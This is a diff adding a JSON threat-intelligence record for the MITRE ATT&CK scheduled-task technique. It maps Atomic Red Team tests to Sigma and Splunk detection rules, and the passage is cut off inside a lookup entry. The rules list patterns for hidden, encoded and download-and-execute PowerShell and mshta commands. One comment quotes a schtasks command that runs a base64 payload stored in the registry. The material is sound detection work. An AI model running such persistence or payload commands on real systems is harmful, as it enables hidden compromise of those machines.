@@ -1,0 +1,943 @@
+{
+    "id": "T1053.005",
+    "name": "Scheduled Task",
+    "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The `schtasks` can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\nThe deprecated [at](S0110) utility could also be abused by adversaries (ex: [At (Windows)](T1053.002)), though `at.exe` can not access tasks created with `schtasks` or the Control Panel.\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).",
+    "platforms": "Windows",
+    "kill_chain_phases": "Execution, Persistence, Privilege Escalation",
+    "data_sources": "Scheduled Job: Scheduled Job Creation, Command: Command Execution, File: File Modification, Process: Process Creation",
+    "detection": "Monitor process execution from the `svchost.exe` in Windows 10 and the Windows Task Scheduler `taskeng.exe` for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%System32Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
+    "url": "https://attack.mitre.org/techniques/T1053/005",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1053.005",
+                "atomic_attack_guid": "704333ca-cc12-4bcf-9916-101844881f54",
+                "atomic_attack_name": "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Potential Execution of Sysinternals Tools",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml",
+                        "remote_content": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Command and Scripting Interpreter Hunting Path Traversal",
+                        "rule_link": "https://research.splunk.com/endpoint/d0026380-b3c4-4da0-ac8e-02790063ff6b/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1053.005",
+                "atomic_attack_guid": "2e5eac3e-327b-4a88-a0c0-c4057039a8dd",
+                "atomic_attack_name": "Scheduled task Remote",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml",
+                        "remote_content": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Schtasks Create Run As System",
+                        "rule_link": "https://research.splunk.com/endpoint/41a0e58e-884c-11ec-9976-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1053.005",
+                "atomic_attack_guid": "fec27f65-db86-4c2d-b66c-61945aee87c2",
+                "atomic_attack_name": "Scheduled Task Startup Script",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Schtasks Schedule Type With High Privileges",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type_system.yml",
+                        "remote_content": "title: Suspicious Schtasks Schedule Type With High Privileges\nid: 7a02e22e-b885-4404-b38b-1ddc7e65258a\nrelated:\n    - id: 24c8392b-aa3c-46b7-a545-43f71657fe98\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-31\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    selection_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_*\nfalsepositives:\n    - Some installers were seen using this method of creation unfortunately. Filter them in your environment\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Command Patterns In Scheduled Task Creation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml",
+                        "remote_content": "title: Suspicious Command Patterns In Scheduled Task Creation\nid: f2c64357-b1d2-41b7-849f-34d2682c0fad\nstatus: test\ndescription: Detects scheduled task creation using \"schtasks\" that contain potentially suspicious or uncommon commands\nreferences:\n    - https://app.any.run/tasks/512c1352-6380-4436-b27d-bb62f0c020d6/\n    - https://twitter.com/RedDrip7/status/1506480588827467785\n    - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-23\nmodified: 2024-03-19\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_schtasks:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: '/Create '\n    selection_pattern_1:\n        CommandLine|contains:\n            - '/sc minute '\n            - '/ru system '\n    selection_pattern_2:\n        CommandLine|contains:\n            - 'cmd /c'\n            - 'cmd /k'\n            - 'cmd /r'\n            - 'cmd.exe /c '\n            - 'cmd.exe /k '\n            - 'cmd.exe /r '\n    selection_uncommon:\n        CommandLine|contains:\n            - ' -decode '\n            - ' -enc '\n            - ' -w hidden '\n            - ' bypass '\n            - ' IEX'\n            - '.DownloadData'\n            - '.DownloadFile'\n            - '.DownloadString'\n            - '/c start /min ' # https://twitter.com/RedDrip7/status/1506480588827467785\n            - 'FromBase64String'\n            - 'mshta http'\n            - 'mshta.exe http'\n    selection_anomaly_1:\n        CommandLine|contains:\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Tmp\\'\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\Temp\\'\n            - '\\AppData\\'\n            - '%AppData%'\n            - '%Temp%'\n            - '%tmp%'\n    selection_anomaly_2:\n        CommandLine|contains:\n            - 'cscript'\n            - 'curl'\n            - 'wscript'\n    condition: selection_schtasks and ( all of selection_pattern_* or selection_uncommon or all of selection_anomaly_* )\nfalsepositives:\n    - Software installers that run from temporary folders and also install scheduled tasks are expected to generate some false positives\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Schtasks Creation Or Modification With SYSTEM Privileges",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_system.yml",
+                        "remote_content": "title: Schtasks Creation Or Modification With SYSTEM Privileges\nid: 89ca78fd-b37c-4310-b3d3-81a023f83936\nstatus: test\ndescription: Detects the creation or update of a scheduled task to run with \"NT AUTHORITY\\SYSTEM\" privileges\nreferences:\n    - https://www.elastic.co/security-labs/exploring-the-qbot-attack-pattern\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-28\nmodified: 2025-02-15\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_root:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains:\n            - ' /change '\n            - ' /create '\n    selection_run:\n        CommandLine|contains: '/ru '\n    selection_user:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM ' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n    filter_optional_teamviewer:\n        # FP from test set in SIGMA\n        # Cannot use ParentImage on all OSes for 4688 events\n        # ParentImage|contains|all:\n        #     - '\\AppData\\Local\\Temp\\'\n        #     - 'TeamViewer_.exe'\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/TN TVInstallRestore'\n            - '\\TeamViewer_.exe'\n    filter_optional_office:\n        CommandLine|contains|all:\n            # https://answers.microsoft.com/en-us/msoffice/forum/all/office-15-subscription-heartbeat-task-created-on/43ab5e53-a9fb-47c6-8c14-44889974b9ff\n            - 'Subscription Heartbeat'\n            - '\\HeartbeatConfig.xml'\n            - '\\Microsoft Shared\\OFFICE'\n    filter_optional_avira:\n        CommandLine|contains:\n            - '/Create /F /RU System /SC WEEKLY /TN AviraSystemSpeedupVerify /TR '\n            - ':\\Program Files (x86)\\Avira\\System Speedup\\setup\\avira_speedup_setup.exe'\n            - '/VERIFY /VERYSILENT /NOSTART /NODOTNET /NORESTART\" /RL HIGHEST'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml",
+                        "remote_content": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Schtasks Create Run As System",
+                        "rule_link": "https://research.splunk.com/endpoint/41a0e58e-884c-11ec-9976-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1053.005",
+                "atomic_attack_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
+                "atomic_attack_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Scheduled Task Executing Encoded Payload from Registry",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader_encoded.yml",
+                        "remote_content": "title: Scheduled Task Executing Encoded Payload from Registry\nid: c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78\nstatus: test\ndescription: Detects the creation of a schtask that potentially executes a base64 encoded payload stored in the Windows Registry using PowerShell.\nreferences:\n    - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\nauthor: pH-T (Nextron Systems), @Kostastsale, @TheDFIRReport, X__Junior (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-02-12\nmodified: 2023-02-04\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.t1053.005\n    - attack.t1059.001\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        # schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_cli_create:\n        CommandLine|contains: '/Create'\n    selection_cli_encoding:\n        CommandLine|contains:\n            - 'FromBase64String'\n            - 'encodedcommand'\n    selection_cli_get:\n        CommandLine|contains:\n            - 'Get-ItemProperty'\n            - ' gp ' # Alias\n    selection_cli_hive:\n        CommandLine|contains:\n            - 'HKCU:'\n            - 'HKLM:'\n            - 'registry::'\n            - 'HKEY_'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Command Patterns In Scheduled Task Creation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_susp_pattern.yml",
+                        "remote_content": "title: Suspicious Command Patterns In Scheduled Task Creation\nid: f2c64357-b1d2-41b7-849f-34d2682c0fad\nstatus: test\ndescription: Detects scheduled task creation using \"schtasks\" that contain potentially suspicious or uncommon commands\nreferences:\n    - https://app.any.run/tasks/512c1352-6380-4436-b27d-bb62f0c020d6/\n    - https://twitter.com/RedDrip7/status/1506480588827467785\n    - https://www.ncsc.gov.uk/static-assets/documents/malware-analysis-reports/devil-bait/NCSC-MAR-Devil-Bait.pdf\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-23\nmodified: 2024-03-19\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_schtasks:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: '/Create '\n    selection_pattern_1:\n        CommandLine|contains:\n            - '/sc minute '\n            - '/ru system '\n    selection_pattern_2:\n        CommandLine|contains:\n            - 'cmd /c'\n            - 'cmd /k'\n            - 'cmd /r'\n            - 'cmd.exe /c '\n            - 'cmd.exe /k '\n            - 'cmd.exe /r '\n    selection_uncommon:\n        CommandLine|contains:\n            - ' -decode '\n            - ' -enc '\n            - ' -w hidden '\n            - ' bypass '\n            - ' IEX'\n            - '.DownloadData'\n            - '.DownloadFile'\n            - '.DownloadString'\n            - '/c start /min ' # https://twitter.com/RedDrip7/status/1506480588827467785\n            - 'FromBase64String'\n            - 'mshta http'\n            - 'mshta.exe http'\n    selection_anomaly_1:\n        CommandLine|contains:\n            - ':\\ProgramData\\'\n            - ':\\Temp\\'\n            - ':\\Tmp\\'\n            - ':\\Users\\Public\\'\n            - ':\\Windows\\Temp\\'\n            - '\\AppData\\'\n            - '%AppData%'\n            - '%Temp%'\n            - '%tmp%'\n    selection_anomaly_2:\n        CommandLine|contains:\n            - 'cscript'\n            - 'curl'\n            - 'wscript'\n    condition: selection_schtasks and ( all of selection_pattern_* or selection_uncommon or all of selection_anomaly_* )\nfalsepositives:\n    - Software installers that run from temporary folders and also install scheduled tasks are expected to generate some false positives\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml",
+                        "remote_content": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1053.005",
+                "atomic_attack_guid": "42f53695-ad4a-4546-abb6-7d837f644a71",
+                "atomic_attack_name": "Scheduled task Local",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Schtasks Schedule Types",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_schedule_type.yml",
+                        "remote_content": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_schtasks_creation.yml",
+                        "remote_content": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
+                    "b0d77106-7bb0-41fe-bd94-d1752164d066",
+                    "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
+                    "761270e6-3a97-4c18-9a44-a844cb5b562b",
+                    "8a8379b8-780b-4dbf-b1e9-31c8d112fefb",
+                    "f548a603-c9f2-4c89-b511-b089f7e94549",
+                    "3a734d25-df5c-4b99-8034-af1ddb5883a4",
+                    "005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
+                    "9e2e51c5-c699-4794-ba5a-29f5da40ac0c",
+                    "c0580559-a6bd-4ef6-b9b7-83703d98b561",
+                    "ff3af8b5-2d14-40ec-9dd2-14e100011e51",
+                    "f2c64357-b1d2-41b7-849f-34d2682c0fad",
+                    "a8f29a7b-b137-4446-80a0-b804272f3da2",
+                    "81325ce1-be01-4250-944f-b4789644556f",
+                    "c5c00f49-b3f9-45a6-997e-cfdecc6e1967",
+                    "1c0e41cd-21bb-4433-9acc-4a2cd6367b9b",
+                    "1cfac73c-be78-4f9a-9b08-5bde0c3953ab",
+                    "24c8392b-aa3c-46b7-a545-43f71657fe98",
+                    "c1bd5026-520b-45bd-9a79-82d38cf96c7b",
+                    "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
+                    "7a02e22e-b885-4404-b38b-1ddc7e65258a",
+                    "363eccc0-279a-4ccf-a3ab-24c2e63b11fb",
+                    "4720b7df-40c3-48fd-bbdf-fd4b3c464f0d",
+                    "958d81aa-8566-4cea-a565-59ccd4df27b0",
+                    "424273ea-7cf8-43a6-b712-375f925e481f",
+                    "73a883d0-0348-4be4-a8d8-51031c2564f8",
+                    "89ca78fd-b37c-4310-b3d3-81a023f83936",
+                    "931b6802-d6a6-4267-9ffa-526f57f22aaf",
+                    "9494479d-d994-40bf-a8b1-eea890237021",
+                    "b20f6158-9438-41be-83da-a5a16ac90c2b",
+                    "e1118a8f-82f5-44b3-bb6b-8a284e5df602",
+                    "f35d4a9f-881b-46b7-9d8a-887a40bce133",
+                    "ff2fff64-4cd6-4a2b-ba7d-e28a30bbe66b",
+                    "92626ddd-662c-49e3-ac59-f6535f12d189",
+                    "614cf376-6651-47c4-9dcc-6b9527f749f4",
+                    "74ad4314-482e-4c3e-b237-3f7ed3b9ca8d",
+                    "b66474aa-bd92-4333-a16c-298155b120df",
+                    "39019a4e-317f-4ce3-ae63-309a8c6b53c5",
+                    "53ba33fd-3a50-4468-a5ef-c583635cfa92",
+                    "4f86b304-3e02-40e3-aa5d-e88a167c9617",
+                    "56c217c3-2de2-479b-990f-5c109ba8458f",
+                    "7595ba94-cf3b-4471-aa03-4f6baa9e5fad",
+                    "ce6e34ca-966d-41c9-8d93-5b06c8b97a06"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
+                        "lookup_data": {
+                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_reg1\n  selection_reg1:\n    TargetObject|endswith:\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UMe\n    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\UT\nfalsepositives:\n- Unknown\nid: 7bdf2a7c-3acc-4091-9581-0a77dad1c5b5\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - Registry\n",
+                            "sigma:id": "7bdf2a7c-3acc-4091-9581-0a77dad1c5b5",
+                            "title": "Chafer Activity - Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b0d77106-7bb0-41fe-bd94-d1752164d066",
+                        "lookup_data": {
+                            "description": "Detects rare scheduled tasks creations that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious code",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/23\ndescription: Detects rare scheduled tasks creations that only appear a few times per\n  time frame and could reveal password dumpers, backdoor installs or other types of\n  malicious code\ndetection:\n  condition: selection | count() by TaskName < 5\n  selection:\n    EventID: 4698\n  timeframe: 7d\nfalsepositives:\n- Software installation\n- Software updates\nid: b0d77106-7bb0-41fe-bd94-d1752164d066\nlevel: low\nlogsource:\n  definition: The Advanced Audit Policy setting Object Access > Audit Other Object\n    Access Events has to be configured to allow this detection (not in the baseline\n    recommendations by Microsoft). We also recommend extracting the Command field\n    from the embedded XML in the event data.\n  product: windows\n  service: security\nmodified: 2021/11/27\nstatus: test\ntags:\n- attack.execution\n- attack.privilege_escalation\n- attack.persistence\n- car.2013-08-001\n- attack.t1053.005\ntitle: Rare Schtasks Creations\n",
+                            "sigma:id": "b0d77106-7bb0-41fe-bd94-d1752164d066",
+                            "title": "Rare Schtasks Creations",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
+                        "lookup_data": {
+                            "description": "Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.",
